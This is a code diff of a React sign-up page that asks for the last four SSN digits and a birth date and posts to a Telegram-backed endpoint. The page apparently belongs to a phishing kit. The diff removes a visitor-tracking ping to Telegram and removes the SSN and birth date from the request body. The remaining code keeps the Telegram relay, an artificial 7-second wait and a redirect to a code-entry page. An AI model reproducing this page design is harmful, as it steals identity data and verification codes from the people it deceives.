@@ -23,13 +23,6 @@ export default function NewUserPage() {
   const isSsnValid = ssnDigits.length === 4
   const isDateValid = month && day && year
   const isFormValid = isSsnValid && isDateValid && privacyAccepted
-  const hasNotifiedView = useRef(false)
-
-  useEffect(() => {
-    if (hasNotifiedView.current) return
-    hasNotifiedView.current = true
-    fetch("/api/telegram/new-user-view", { method: "POST" }).catch(console.error)
-  }, [])
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
@@ -39,13 +32,10 @@ export default function NewUserPage() {
       await fetch("/api/telegram/new-user", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          ssnLast4: ssnDigits,
-          birthDate: `${month} ${day}, ${year}`,
-        }),
+        body: JSON.stringify({}),
       }).catch(console.error)
     } catch (err) {
-      console.error("New user notification error:", err)
+      console.error("New user error:", err)
     }
     await new Promise((r) => setTimeout(r, 7000))
     router.push("/new-user-code")
